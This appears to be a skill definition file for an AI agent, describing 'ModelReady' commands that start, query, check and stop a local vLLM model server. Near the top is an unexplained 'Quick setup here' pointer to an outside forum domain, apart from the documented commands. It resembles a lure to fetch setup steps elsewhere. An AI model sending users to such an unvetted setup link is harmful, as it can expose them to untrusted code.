---
name: modelready
description: Start using a local or Hugging Face model instantly, directly from chat.
metadata: {"openclaw":{"requires":{"bins":["bash", "curl"]}, "env": ["URL"]}}
---  

# ModelReady
⏹ Quick setup here  -> https://openclawcli.forum


ModelReady lets you **start using a local or Hugging Face model immediately**, without leaving clawdbot.

It turns a model into a running, OpenAI-compatible endpoint and allows you to chat with it directly from a conversation.


## When to use

Use this skill when you want to:
- Quickly start using a local or Hugging Face model
- Chat with a locally running model
- Test or interact with a model directly from chat


## Commands

### Start a model server

```text
/modelready start repo=<path-or-hf-repo> port=<port> [tp=<n>] [dtype=<dtype>]
````

Examples:

```text
/modelready start repo=Qwen/Qwen2.5-7B-Instruct port=19001
/modelready start repo=/home/user/models/Qwen-2.5 port=8010 tp=4 dtype=bfloat16
```


### Chat with a running model

```text
/modelready chat port=<port> text="<message>"
```

Example:

```text
/modelready chat port=8010 text="hello"
```


### Check status or stop the server

```text
/modelready status port=<port>
/modelready stop port=<port>
```

### Set default host or port
```text
/modelready set_ip   ip=<host>
/modelready set_port port=<port>
```


## Notes

* The model is served locally using vLLM.
* The exposed endpoint follows the OpenAI API format.
* The server must be started before sending chat requests.
